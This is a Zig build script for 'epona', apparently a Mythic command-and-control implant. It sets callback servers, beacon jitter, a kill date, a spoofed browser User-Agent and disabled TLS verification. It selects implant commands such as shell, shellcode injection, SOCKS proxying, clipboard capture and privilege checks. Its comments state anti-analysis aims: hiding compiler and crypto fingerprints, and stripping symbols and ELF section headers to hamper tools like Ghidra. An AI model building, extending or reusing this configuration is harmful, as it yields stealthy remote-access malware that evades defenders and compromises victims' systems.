const std = @import("std");

pub fn build(b: *std.Build) void {
    var target = b.standardTargetOptions(.{});
    const optimize = b.standardOptimizeOption(.{});

    // Enforce hardware AES-NI on x86_64 so Zig's crypto never compiles in
    // software AES T-tables (a known static-analysis fingerprint).
    if (target.result.cpu.arch == .x86_64) {
        const Feature = std.Target.x86.Feature;
        target.result.cpu.features.addFeature(@intFromEnum(Feature.aes));
        target.result.cpu.features.addFeature(@intFromEnum(Feature.pclmul));
    }

    const opts = b.addOptions();
    opts.addOption([]const u8, "c2_profile",              b.option([]const u8, "c2_profile",              "C2 profile: mqtt or http")        orelse "mqtt");
    opts.addOption([]const u8, "mqtt_server_0",            b.option([]const u8, "mqtt_server_0",            "MQTT broker hostname (primary)")   orelse "localhost");
    opts.addOption([]const u8, "mqtt_server_1",            b.option([]const u8, "mqtt_server_1",            "MQTT broker hostname (fallback 1)") orelse "");
    opts.addOption([]const u8, "mqtt_server_2",            b.option([]const u8, "mqtt_server_2",            "MQTT broker hostname (fallback 2)") orelse "");
    opts.addOption([]const u8, "mqtt_server_3",            b.option([]const u8, "mqtt_server_3",            "MQTT broker hostname (fallback 3)") orelse "");
    opts.addOption(u16,        "mqtt_port",               b.option(u16,        "mqtt_port",               "MQTT broker port")                orelse 8883);
    opts.addOption(bool,       "use_ssl",                 b.option(bool,       "use_ssl",                 "Use TLS/SSL for MQTT")            orelse true);
    opts.addOption(bool,       "skip_tls_verify",         b.option(bool,       "skip_tls_verify",         "Skip TLS certificate verification") orelse true);
    opts.addOption([]const u8, "http_host",               b.option([]const u8, "http_host",               "HTTP callback hostname")          orelse "localhost");
    opts.addOption(u16,        "http_port",               b.option(u16,        "http_port",               "HTTP callback port")              orelse 80);
    opts.addOption([]const u8, "http_post_uri",           b.option([]const u8, "http_post_uri",           "HTTP POST URI path")              orelse "data");
    opts.addOption(bool,       "http_use_ssl",            b.option(bool,       "http_use_ssl",            "Use HTTPS for HTTP profile")      orelse false);
    opts.addOption([]const u8, "http_user_agent",         b.option([]const u8, "http_user_agent",         "HTTP User-Agent header")          orelse "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko");
    opts.addOption([]const u8, "mqtt_client_id",          b.option([]const u8, "mqtt_client_id",          "MQTT client ID")                  orelse "epona");
    opts.addOption([]const u8, "mqtt_user",               b.option([]const u8, "mqtt_user",               "MQTT username")                   orelse "");
    opts.addOption([]const u8, "mqtt_pass",               b.option([]const u8, "mqtt_pass",               "MQTT password")                   orelse "");
    opts.addOption([]const u8, "mqtt_topic",              b.option([]const u8, "mqtt_topic",              "MQTT base topic")                 orelse "billbradley/");
    opts.addOption([]const u8, "mqtt_recv_topic",         b.option([]const u8, "mqtt_recv_topic",         "Receive sub-topic (Mythic→Agent)") orelse "1");
    opts.addOption([]const u8, "mqtt_send_topic",         b.option([]const u8, "mqtt_send_topic",         "Send sub-topic (Agent→Mythic)")    orelse "2");
    opts.addOption(u32,        "callback_interval",       b.option(u32,        "callback_interval",       "Sleep seconds between callbacks")  orelse 10);
    opts.addOption(u32,        "callback_jitter",         b.option(u32,        "callback_jitter",         "Jitter percentage 0-100")         orelse 14);
    opts.addOption(u64,        "kill_timestamp",          b.option(u64,        "kill_timestamp",          "Unix timestamp kill date")        orelse 9999999999);
    opts.addOption([]const u8, "crypto_type",             b.option([]const u8, "crypto_type",             "aes256_hmac or none")             orelse "none");
    opts.addOption([]const u8, "enc_key",                 b.option([]const u8, "enc_key",                 "Base64 AES encryption key")       orelse "");
    opts.addOption([]const u8, "dec_key",                 b.option([]const u8, "dec_key",                 "Base64 AES decryption key")       orelse "");
    opts.addOption([]const u8, "payload_uuid",            b.option([]const u8, "payload_uuid",            "Mythic payload UUID")             orelse "00000000-0000-0000-0000-000000000000");
    opts.addOption(bool,       "encrypted_exchange_check",b.option(bool,       "encrypted_exchange_check","Perform EKE")                     orelse false);
    opts.addOption(u64,        "build_salt",              b.option(u64,        "build_salt",              "Random build salt")               orelse 0);

    // Per-command inclusion flags — set by builder.py from operator selection
    // exit and sleep are always present (control commands); all others are optional.
    opts.addOption(bool, "include_shell",     b.option(bool, "include_shell",     "compile shell")     orelse false);
    opts.addOption(bool, "include_run",       b.option(bool, "include_run",       "compile run")       orelse false);
    opts.addOption(bool, "include_cat",       b.option(bool, "include_cat",       "compile cat")       orelse false);
    opts.addOption(bool, "include_ls",        b.option(bool, "include_ls",        "compile ls")        orelse false);
    opts.addOption(bool, "include_cd",        b.option(bool, "include_cd",        "compile cd")        orelse false);
    opts.addOption(bool, "include_pwd",       b.option(bool, "include_pwd",       "compile pwd")       orelse false);
    opts.addOption(bool, "include_env",       b.option(bool, "include_env",       "compile env")       orelse false);
    opts.addOption(bool, "include_ps",        b.option(bool, "include_ps",        "compile ps")        orelse false);
    opts.addOption(bool, "include_kill",      b.option(bool, "include_kill",      "compile kill")      orelse false);
    opts.addOption(bool, "include_netstat",   b.option(bool, "include_netstat",   "compile netstat")   orelse false);
    opts.addOption(bool, "include_cron",      b.option(bool, "include_cron",      "compile cron")      orelse false);
    opts.addOption(bool, "include_shinject",  b.option(bool, "include_shinject",  "compile shinject")  orelse false);
    opts.addOption(bool, "include_portscan",  b.option(bool, "include_portscan",  "compile portscan")  orelse false);
    opts.addOption(bool, "include_download",  b.option(bool, "include_download",  "compile download")  orelse false);
    opts.addOption(bool, "include_upload",    b.option(bool, "include_upload",    "compile upload")    orelse false);
    opts.addOption(bool, "include_socks",     b.option(bool, "include_socks",     "compile socks")     orelse false);
    opts.addOption(bool, "include_mkdir",     b.option(bool, "include_mkdir",     "compile mkdir")     orelse false);
    opts.addOption(bool, "include_cp",        b.option(bool, "include_cp",        "compile cp")        orelse false);
    opts.addOption(bool, "include_mv",        b.option(bool, "include_mv",        "compile mv")        orelse false);
    opts.addOption(bool, "include_rm",        b.option(bool, "include_rm",        "compile rm")        orelse false);
    opts.addOption(bool, "include_find",      b.option(bool, "include_find",      "compile find")      orelse false);
    opts.addOption(bool, "include_sudo",      b.option(bool, "include_sudo",      "compile sudo")      orelse false);
    opts.addOption(bool, "include_clipboard", b.option(bool, "include_clipboard", "compile clipboard") orelse false);
    opts.addOption(bool, "include_getprivs",  b.option(bool, "include_getprivs",  "compile getprivs")  orelse false);
    opts.addOption(bool, "include_services",  b.option(bool, "include_services",  "compile services")  orelse false);
    opts.addOption(bool, "include_launchctl", b.option(bool, "include_launchctl", "compile launchctl") orelse false);
    opts.addOption(bool, "include_osascript", b.option(bool, "include_osascript", "compile osascript") orelse false);
    opts.addOption(bool, "include_jobs",      b.option(bool, "include_jobs",      "compile jobs")      orelse false);
    opts.addOption(bool, "include_jobkill",   b.option(bool, "include_jobkill",   "compile jobkill")   orelse false);

    const exe = b.addExecutable(.{
        .name            = "epona",
        .root_source_file = b.path("src/main.zig"),
        .target          = target,
        .optimize        = optimize,
    });
    exe.root_module.addOptions("config", opts);

    // Strip debug info and symbol table unless explicitly building for debug.
    // Removes 83% of binary size and eliminates all function names, type names,
    // and source paths from the binary.
    exe.root_module.strip = (optimize != .Debug);

    // Reduce stack size from Zig's 16 MB default to 8 MB.
    // 16 MB PT_GNU_STACK is a well-known Zig compiler fingerprint.
    exe.stack_size = 8 * 1024 * 1024;

    // Dead-strip unreferenced sections (already default for ReleaseSmall, explicit here).
    exe.link_gc_sections = true;

    b.installArtifact(exe);

    // Strip ELF section header table from release Linux builds.
    // readelf/objdump/Ghidra degrade without it; PT_LOAD segments still work.
    // "|| true" makes incremental rebuilds safe when binary is already stripped.
    if (optimize != .Debug and target.result.os.tag == .linux) {
        const strip_shdrs = b.addSystemCommand(&[_][]const u8{
            "/bin/sh", "-c",
            "objcopy --strip-section-headers \"$1\" 2>/dev/null || true",
            "strip_shdrs",
        });
        strip_shdrs.addArtifactArg(exe);
        strip_shdrs.step.dependOn(&exe.step);
        b.getInstallStep().dependOn(&strip_shdrs.step);
    }
}
